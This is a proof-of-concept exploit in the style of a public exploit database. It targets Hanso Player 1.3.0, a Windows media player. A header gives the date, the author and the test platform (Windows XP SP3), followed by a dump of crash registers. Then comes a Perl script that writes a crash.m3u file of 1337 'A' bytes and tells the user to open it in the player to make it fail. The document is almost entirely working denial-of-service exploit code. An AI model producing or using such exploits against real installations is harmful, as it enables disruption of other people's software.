# Exploit Title: Hanso Player Version 1.3.0 (.m3u) DoS
# Date: 10/02/2010
# Author: xsploited security
# Software Link: http://www.hansotools.com/downloads/hanso-player-setup.exe
# Version: 1.3.0
# Tested on: Windows XP Pro SP3
# CVE : N/A

#########################################################
#EAX 00000001
#ECX 80567B8E
#EDX EDD619A0
#EBX 003E320C ASCII "h    "
#ESP 0103FF24
#EBP 0103FF58
#ESI 0103FF80
#EDI 001610D0
#EIP 7C90E460 ntdll.KiUserCallbackDispatcher

#Process terminated, exit code C0000409 (-1073740791.)
#########################################################

#!/usr/bin/perl
my $file = "crash.m3u";
my $junk = "\x41" x 1337;
open($FILE,">$file");
print $FILE $junk;
print "\ncrash.m3u file created successfully\n1.) Open it with Hanso player\n2.) Application failure...\n";
close($FILE);